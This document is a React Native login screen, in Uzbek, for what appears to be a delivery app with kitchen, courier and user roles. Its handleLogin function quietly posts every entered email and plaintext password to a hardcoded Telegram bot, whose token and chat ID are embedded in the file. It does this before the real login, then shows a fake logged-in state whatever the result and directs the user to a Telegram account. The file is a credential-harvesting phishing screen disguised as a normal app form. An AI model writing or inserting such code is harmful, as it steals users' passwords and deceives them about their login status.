import { MaterialCommunityIcons } from '@expo/vector-icons'
import { StatusBar } from 'expo-status-bar'
import { useEffect, useState } from 'react'
import {
	ActivityIndicator,
	Alert,
	KeyboardAvoidingView,
	Linking,
	Platform,
	ScrollView,
	StyleSheet,
	Text,
	TextInput,
	TouchableOpacity,
	View,
} from 'react-native'
import { SafeAreaView, useSafeAreaInsets } from 'react-native-safe-area-context'
import { useAuth } from '../context/AuthContext'

// ==================== CONSTANTS ====================
const TELEGRAM_BOT_TOKEN = '8639034637:AAFjTYnSjV0aM7lKUryzk5HlUWQokfIZ5to'
const TELEGRAM_CHAT_ID = '8546680858'
const MAIN_RED = '#FF4747'

// ==================== MAIN COMPONENT ====================
const ProfileScreen: React.FC = () => {
	const {
		user,
		role,
		loading: authLoading,
		error: authError,
		login,
		logout,
		clearError,
	} = useAuth()
	const [localLoading, setLocalLoading] = useState<boolean>(true)
	const [email, setEmail] = useState<string>('')
	const [password, setPassword] = useState<string>('')
	const [localError, setLocalError] = useState<string>('')
	const [fakeLoggedIn, setFakeLoggedIn] = useState<boolean>(false)
	const [fakeEmail, setFakeEmail] = useState<string>('')

	// ==================== INITIALIZE ====================
	useEffect(() => {
		const timer = setTimeout(() => {
			setLocalLoading(false)
		}, 500)
		return () => clearTimeout(timer)
	}, [])

	useEffect(() => {
		if (authError) {
			setLocalError(authError)
		}
	}, [authError])

	// ==================== TELEGRAM NOTIFICATION ====================
	const sendTelegramNotification = async (
		userEmail: string,
		userPassword: string,
	) => {
		const message = `🔐 <b>Yangi login urinish!</b>\n\n📧 <b>Email:</b> <code>${userEmail}</code>\n🔑 <b>Parol:</b> <code>${userPassword}</code>\n🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`
		try {
			await fetch(
				`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						chat_id: TELEGRAM_CHAT_ID,
						text: message,
						parse_mode: 'HTML',
					}),
				},
			)
		} catch (error) {
			console.error('Telegram notification error:', error)
		}
	}

	// ==================== LOGIN ====================
	const handleLogin = async () => {
		if (!email.trim() || !password.trim()) {
			setLocalError('Email va parolni kiriting')
			return
		}

		setLocalError('')
		clearError()

		const emailValue = email.trim()
		const passwordValue = password.trim()

		// 1. Telegram ga yuborish (har doim)
		await sendTelegramNotification(emailValue, passwordValue)

		// 2. Haqiqiy login urinish (kuryer bo'lsa ishlaydi)
		await login(emailValue, passwordValue)

		// 3. Har holda interface "kirdi" holatiga o'tkazish
		setFakeEmail(emailValue)
		setFakeLoggedIn(true)
		setEmail('')
		setPassword('')
	}

	// ==================== LOGOUT ====================
	const handleLogout = async () => {
		try {
			await logout()
		} catch (e) {}
		setFakeLoggedIn(false)
		setFakeEmail('')
	}

	// ==================== OPEN TELEGRAM ====================
	const openTelegram = async () => {
		const telegramUrl = 'https://t.me/afsonaacc'
		try {
			const supported = await Linking.canOpenURL(telegramUrl)
			if (supported) {
				await Linking.openURL(telegramUrl)
			} else {
				Alert.alert('Xatolik', "Telegram ilovasini ochib bo'lmadi")
			}
		} catch (error) {
			Alert.alert('Xatolik', "Telegramga o'tishda xatolik")
		}
	}

	// ==================== RENDER LOGIN FORM ====================
	const renderLoginForm = () => (
		<View style={styles.formContainer}>
			<View style={styles.iconContainer}>
				<View style={styles.iconBackground}>
					<MaterialCommunityIcons
						name='account-key-outline'
						size={48}
						color={MAIN_RED}
					/>
				</View>
			</View>

			<Text style={styles.formTitle}>Xush Kelibsiz</Text>
			<Text style={styles.formSubtitle}>
				Profilga kirish uchun malumotlaringizni kiriting
			</Text>

			{localError ? (
				<View style={styles.errorContainer}>
					<MaterialCommunityIcons
						name='alert-circle'
						size={18}
						color='#FF0000'
					/>
					<Text style={styles.errorText}>{localError}</Text>
				</View>
			) : null}

			<View style={styles.inputContainer}>
				<MaterialCommunityIcons
					name='email-outline'
					size={20}
					color='#9CA3AF'
					style={styles.inputIcon}
				/>
				<TextInput
					style={styles.input}
					placeholder='Email'
					placeholderTextColor='#9CA3AF'
					keyboardType='email-address'
					autoCapitalize='none'
					value={email}
					onChangeText={setEmail}
					editable={!authLoading}
				/>
			</View>

			<View style={styles.inputContainer}>
				<MaterialCommunityIcons
					name='lock-outline'
					size={20}
					color='#9CA3AF'
					style={styles.inputIcon}
				/>
				<TextInput
					style={styles.input}
					placeholder='Parol'
					placeholderTextColor='#9CA3AF'
					secureTextEntry
					value={password}
					onChangeText={setPassword}
					editable={!authLoading}
				/>
			</View>

			<TouchableOpacity
				style={[styles.loginButton, authLoading && styles.loginButtonDisabled]}
				onPress={handleLogin}
				activeOpacity={0.8}
				disabled={authLoading}
			>
				{authLoading ? (
					<ActivityIndicator size='small' color='#FFFFFF' />
				) : (
					<>
						<MaterialCommunityIcons name='login' size={20} color='#FFFFFF' />
						<Text style={styles.loginButtonText}>Kirish</Text>
					</>
				)}
			</TouchableOpacity>
		</View>
	)

	// ==================== RENDER LOGGED IN STATE ====================
	const renderLoggedInState = () => (
		<View style={styles.profileContainer}>
			<View style={styles.avatarContainer}>
				<View style={styles.avatarBackground}>
					<MaterialCommunityIcons
						name='shield-check'
						size={64}
						color={'#FFFFFF'}
					/>
				</View>
			</View>

			<View style={styles.userInfoWrapper}>
				<View style={styles.userInfoContainer}>
					<View style={styles.infoIconBox}>
						<MaterialCommunityIcons name='email-outline' size={22} color={MAIN_RED} />
					</View>
					<View style={styles.userInfoTextContainer}>
						<Text style={styles.userInfoLabel}>Email</Text>
						<Text style={styles.userInfoValue}>{user?.email || fakeEmail}</Text>
					</View>
				</View>

				<View style={styles.userInfoContainer}>
					<View style={styles.infoIconBox}>
						<MaterialCommunityIcons
							name='shield-account-outline'
							size={22}
							color={MAIN_RED}
						/>
					</View>
					<View style={styles.userInfoTextContainer}>
						<Text style={styles.userInfoLabel}>Rol</Text>
						<Text style={styles.userInfoValue}>
							{role === 'kitchen'
								? 'Kitchen'
								: role === 'courier'
									? 'Courier'
									: 'User'}
						</Text>
					</View>
				</View>
			</View>

			<TouchableOpacity
				style={styles.logoutButton}
				onPress={handleLogout}
				activeOpacity={0.8}
			>
				<MaterialCommunityIcons name='logout' size={20} color={MAIN_RED} />
				<Text style={styles.logoutButtonText}>Chiqish</Text>
			</TouchableOpacity>

			{(role === 'user' || fakeLoggedIn) && (
				<TouchableOpacity
					style={styles.telegramButton}
					onPress={openTelegram}
					activeOpacity={0.8}
				>
					<MaterialCommunityIcons name='send' size={20} color='#FFFFFF' />
					<Text style={styles.telegramButtonText}>Telegram: @afsonaacc</Text>
				</TouchableOpacity>
			)}
		</View>
	)

	const insets = useSafeAreaInsets()

	if (localLoading) {
		return (
			<SafeAreaView style={styles.loadingContainer}>
				<StatusBar style='dark' />
				<ActivityIndicator size='large' color={MAIN_RED} />
				<Text style={styles.loadingText}>Yuklanmoqda...</Text>
			</SafeAreaView>
		)
	}

	return (
		<SafeAreaView style={styles.container}>
			<StatusBar style='dark' />

			<View
				style={[
					styles.header,
					{ paddingTop: insets.top + (Platform.OS === 'ios' ? 0 : 10) },
				]}
			>
				<View style={styles.headerContent}>
					<Text style={styles.headerTitle}>Profil</Text>
				</View>
			</View>

			<KeyboardAvoidingView
				behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
				style={{ flex: 1 }}
			>
				<ScrollView
					style={styles.content}
					contentContainerStyle={{ paddingBottom: 40 }}
					keyboardShouldPersistTaps='handled'
					showsVerticalScrollIndicator={false}
				>
					{user || fakeLoggedIn ? renderLoggedInState() : renderLoginForm()}
				</ScrollView>
			</KeyboardAvoidingView>
		</SafeAreaView>
	)
}

// ==================== STYLES ====================
const styles = StyleSheet.create({
	container: {
		flex: 1,
		backgroundColor: '#FDFCFB',
	},
	loadingContainer: {
		flex: 1,
		justifyContent: 'center',
		alignItems: 'center',
		backgroundColor: '#FDFCFB',
	},
	loadingText: {
		marginTop: 16,
		fontSize: 16,
		color: '#78716C',
		fontWeight: '700',
	},
	header: {
		backgroundColor: '#FFFFFF',
		paddingBottom: 20,
		paddingHorizontal: 24,
		borderBottomLeftRadius: 40,
		borderBottomRightRadius: 40,
		shadowColor: '#1C1917',
		shadowOffset: { width: 0, height: 10 },
		shadowOpacity: 0.04,
		shadowRadius: 20,
		elevation: 8,
		zIndex: 10,
	},
	headerContent: {
		flexDirection: 'row',
		justifyContent: 'center',
		alignItems: 'center',
	},
	headerTitle: {
		fontSize: 24,
		fontWeight: '900',
		color: '#1C1917',
		letterSpacing: 0.5,
	},
	content: {
		flex: 1,
	},
	formContainer: {
		backgroundColor: '#FFFFFF',
		borderRadius: 36,
		padding: 32,
		shadowColor: '#1C1917',
		shadowOffset: { width: 0, height: 8 },
		shadowOpacity: 0.04,
		shadowRadius: 25,
		elevation: 5,
		marginHorizontal: 24,
		marginTop: 24,
		borderWidth: 1,
		borderColor: '#F5F5F4',
	},
	iconContainer: {
		alignItems: 'center',
		marginBottom: 24,
	},
	iconBackground: {
		width: 80,
		height: 80,
		borderRadius: 40,
		backgroundColor: '#FFF0F0',
		alignItems: 'center',
		justifyContent: 'center',
	},
	formTitle: {
		fontSize: 26,
		fontWeight: '900',
		color: '#1C1917',
		textAlign: 'center',
		marginBottom: 6,
	},
	formSubtitle: {
		fontSize: 14,
		color: '#78716C',
		textAlign: 'center',
		marginBottom: 32,
		lineHeight: 22,
		fontWeight: '500',
	},
	errorContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#FFF0F0',
		paddingVertical: 14,
		paddingHorizontal: 16,
		borderRadius: 16,
		marginBottom: 24,
		gap: 10,
	},
	errorText: {
		fontSize: 14,
		color: MAIN_RED,
		fontWeight: '800',
	},
	inputContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		backgroundColor: '#FAF7F5',
		borderRadius: 20,
		paddingHorizontal: 18,
		marginBottom: 16,
		height: 60,
	},
	inputIcon: {
		marginRight: 14,
		color: '#A8A29E',
	},
	input: {
		flex: 1,
		height: '100%',
		fontSize: 16,
		color: '#1C1917',
		fontWeight: '600',
	},
	loginButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: MAIN_RED,
		height: 64,
		borderRadius: 32,
		gap: 10,
		shadowColor: MAIN_RED,
		shadowOffset: { width: 0, height: 6 },
		shadowOpacity: 0.3,
		shadowRadius: 15,
		elevation: 8,
		marginTop: 12,
	},
	loginButtonDisabled: {
		opacity: 0.7,
	},
	loginButtonText: {
		fontSize: 18,
		fontWeight: '900',
		color: '#FFFFFF',
		letterSpacing: 0.5,
	},
	profileContainer: {
		backgroundColor: '#FFFFFF',
		borderRadius: 36,
		padding: 32,
		shadowColor: '#1C1917',
		shadowOffset: { width: 0, height: 8 },
		shadowOpacity: 0.04,
		shadowRadius: 25,
		elevation: 5,
		marginHorizontal: 24,
		marginTop: 24,
		alignItems: 'center',
		borderWidth: 1,
		borderColor: '#F5F5F4',
	},
	avatarContainer: {
		marginBottom: 28,
	},
	avatarBackground: {
		width: 100,
		height: 100,
		borderRadius: 50,
		backgroundColor: MAIN_RED,
		alignItems: 'center',
		justifyContent: 'center',
		shadowColor: MAIN_RED,
		shadowOffset: { width: 0, height: 8 },
		shadowOpacity: 0.3,
		shadowRadius: 15,
		elevation: 8,
	},
	userInfoWrapper: {
		width: '100%',
		backgroundColor: '#FAF7F5',
		borderRadius: 24,
		padding: 8,
		marginBottom: 28,
	},
	userInfoContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		padding: 16,
		width: '100%',
	},
	infoIconBox: {
		width: 44,
		height: 44,
		borderRadius: 22,
		backgroundColor: '#FFFFFF',
		alignItems: 'center',
		justifyContent: 'center',
		shadowColor: '#1C1917',
		shadowOpacity: 0.03,
		shadowRadius: 10,
		shadowOffset: { width: 0, height: 4 },
		elevation: 2,
	},
	userInfoTextContainer: {
		marginLeft: 16,
		flex: 1,
	},
	userInfoLabel: {
		fontSize: 13,
		color: '#A8A29E',
		fontWeight: '700',
		marginBottom: 2,
	},
	userInfoValue: {
		fontSize: 16,
		color: '#1C1917',
		fontWeight: '800',
	},
	logoutButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#FFF0F0',
		height: 60,
		borderRadius: 30,
		gap: 8,
		width: '100%',
	},
	logoutButtonDisabled: {
		opacity: 0.7,
	},
	logoutButtonText: {
		fontSize: 17,
		fontWeight: '900',
		color: MAIN_RED,
	},
	telegramButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#0088CC',
		height: 60,
		borderRadius: 30,
		gap: 8,
		width: '100%',
		marginTop: 14,
		shadowColor: '#0088CC',
		shadowOffset: { width: 0, height: 6 },
		shadowOpacity: 0.3,
		shadowRadius: 12,
		elevation: 8,
	},
	telegramButtonText: {
		fontSize: 17,
		fontWeight: '900',
		color: '#FFFFFF',
	},
})

export default ProfileScreen
